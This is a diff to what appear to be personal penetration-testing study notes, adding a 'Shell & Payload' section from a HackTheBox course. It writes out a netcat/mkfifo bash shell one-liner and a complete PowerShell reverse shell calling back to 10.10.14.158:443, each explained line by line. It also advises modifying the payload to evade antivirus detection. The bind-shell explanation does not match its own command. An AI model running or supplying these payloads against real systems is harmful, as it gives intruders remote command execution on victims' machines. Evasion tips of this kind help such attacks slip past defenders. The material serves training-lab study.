@@ -301,6 +301,71 @@ XAMPP	C:\\xampp\\htdocs\\
 ### Some useful command
 `env`: This will extract a bunch of environment variable current system have, something like that. Don't require root to do so
 
+# Shell & Payload (Exploitation section)
+
+### Basic TCP binding shell
+
+Binding Shell to a TCP session: 
+
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+
+A command like this can be detailed explain like this
+
+- `rm -f /tmp/f;`: Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.
+
+- `mkfifo /tmp/f;`: Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
+
+- `cat /tmp/f |`: Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
+
+- `/bin/bash -i 2>&1 |`: Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).
+
+- `nc 10.10.14.12 7777 > /tmp/f:`Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed
+
+
+        You can playing around with one port -nlvp and one port -nv to it. This is a basic TCP communication at network level. A very foundation of our internet.
+
+
+In windows, paste something like this into CMD: 
+    
+    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Good way to do is to put it into bat file, or paste it into notepad and copy into cmd if using RDP. In short, this command must be pasted inside Command-Prompt to work.
+
+A command like this can be detailed explain like this: 
+
+- `powershell -nop -c`: Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. 
+
+- `"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`: Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.
+
+- `$stream = $client.GetStream();`: Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.
+
+- `[byte[]]$bytes = 0..65535|%{0};`: Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
+
+- `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`: Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.
+
+- `{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`: Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.
+
+- `$sendback = (iex $data 2>&1 | Out-String );`: Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.
+
+- `$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`: Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (;) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.
+
+- `$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`: Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
+
+- `$client.Close()"`: This is the TcpClient.Close method that will be used when the connection is terminated.
+
+A very popular payload to use, so in order to using this efficiently, you have to modified it your own way to prevent detection.
+
+HackTheBox pitch of this section.
+
+    Payloads Take Different Shapes and Forms
+    Understanding what different types of payloads are doing can help us understand why AV is blocking us from execution and give us some idea of what we might need to change in our code to bypass restrictions. This is something we will explore further in this module. For now, understand that the payloads we use to get a shell on a system will largely be determined by what OS, shell interpreter languages, and even programming languages are present on the target.
+
+    Not all payloads are one-liners and deployed manually like those we studied in this section. Some are generated using automated attack frameworks and deployed as a pre-packaged/automated attack to obtain a shell. Like in the very powerful Metasploit-framework, which we will work with in the next section.
+
+### Metasploit
+
+
+
 # Priviledge Escalation
 
 ### Bash/SSH
